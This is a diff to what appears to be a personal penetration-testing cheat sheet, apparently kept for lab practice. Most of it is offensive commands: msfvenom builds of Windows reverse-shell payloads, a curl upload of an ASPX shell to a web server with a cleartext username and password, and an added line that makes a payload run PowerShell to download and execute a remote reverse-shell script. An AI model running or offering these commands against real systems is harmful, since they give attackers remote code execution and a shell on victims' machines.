@@ -447,6 +447,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.137 LPORT=445 -f aspx-exe -o shell42069.aspx
 ***See if you can add it to the WEBDEV server with creds or not***
 curl -T '/home/bruiser/Tools/shell42069yolo.aspx' 'http://192.168.137.122/' -u fmcsorley:CrabSharkJellyfish192
+
+Get super sexy, like really sexy...
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.49.137/Invoke-PowerShellTcp.ps1')\"" -f aspx-exe -o bruiser.aspx
+
 ```
 # BUFFER OVERFLOW 
 ```bash
